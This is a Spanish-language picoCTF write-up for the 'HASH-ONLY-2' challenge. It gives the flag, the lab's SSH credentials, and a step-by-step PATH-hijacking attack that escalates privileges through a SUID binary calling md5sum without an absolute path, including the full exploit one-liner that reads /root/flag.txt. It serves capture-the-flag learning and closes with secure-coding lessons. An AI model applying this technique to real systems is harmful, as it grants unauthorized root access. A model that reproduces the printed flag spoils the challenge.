@@ -1,0 +1,64 @@
+HASH-ONLY-2 - picoCTF - SOLUCIONADO
+====================================
+
+FLAG: picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_f6f1b3d4}
+
+SSH: ssh ctf-player@rescued-float.picoctf.net -p 53978
+Password: 4f5344cd
+
+RESUMEN DE LA SOLUCIÓN:
+-----------------------
+
+1. RECONOCIMIENTO:
+   - Conexión SSH al servidor con las credenciales proporcionadas
+   - Binario SUID ubicado en: /usr/local/bin/flaghasher
+   - El binario tiene permisos: -rwsr-xr-x (se ejecuta como root)
+
+2. ANÁLISIS DEL BINARIO:
+   - Tipo: ELF 64-bit LSB, not stripped
+   - Análisis con strings reveló el comando ejecutado:
+     `/bin/bash -c 'md5sum /root/flag.txt'`
+   - El binario usa setuid(0) y setgid(0) para ejecutar como root
+   - Ejecuta system() con md5sum SIN ruta absoluta
+
+3. VULNERABILIDAD IDENTIFICADA:
+   - PATH Hijacking / Command Injection
+   - El binario ejecuta "md5sum" sin ruta absoluta (/usr/bin/md5sum)
+   - Permite manipular el PATH para ejecutar un "md5sum" malicioso
+
+4. EXPLOTACIÓN:
+   
+   Paso 1: Crear script malicioso en /tmp (tiene permisos de escritura)
+   ```bash
+   bash -c 'echo "#!/bin/bash" > /tmp/md5sum && \
+            echo "cat /root/flag.txt" >> /tmp/md5sum && \
+            chmod +x /tmp/md5sum'
+   ```
+   
+   Paso 2: Modificar PATH y ejecutar flaghasher
+   ```bash
+   export PATH=/tmp:$PATH && /usr/local/bin/flaghasher
+   ```
+
+5. RESULTADO:
+   - El binario ejecutó nuestro script malicioso /tmp/md5sum
+   - Como tiene SUID root, el script se ejecutó con privilegios de root
+   - Obtuvo el contenido de /root/flag.txt en lugar del hash MD5
+
+COMANDO COMPLETO DE EXPLOTACIÓN:
+---------------------------------
+sshpass -p '4f5344cd' ssh -o StrictHostKeyChecking=no \
+  ctf-player@rescued-float.picoctf.net -p 53978 \
+  "bash -c 'echo \"#!/bin/bash\" > /tmp/md5sum && \
+            echo \"cat /root/flag.txt\" >> /tmp/md5sum && \
+            chmod +x /tmp/md5sum && \
+            export PATH=/tmp:\$PATH && \
+            /usr/local/bin/flaghasher'"
+
+LECCIONES APRENDIDAS:
+---------------------
+1. Los binarios SUID deben usar rutas absolutas para ejecutar comandos
+2. Nunca ejecutar comandos externos con system() usando rutas relativas
+3. PATH hijacking es una técnica común para escalar privilegios
+4. La variable PATH se puede manipular para ejecutar código arbitrario
+5. Los binarios deben sanitizar el entorno antes de ejecutar comandos externos
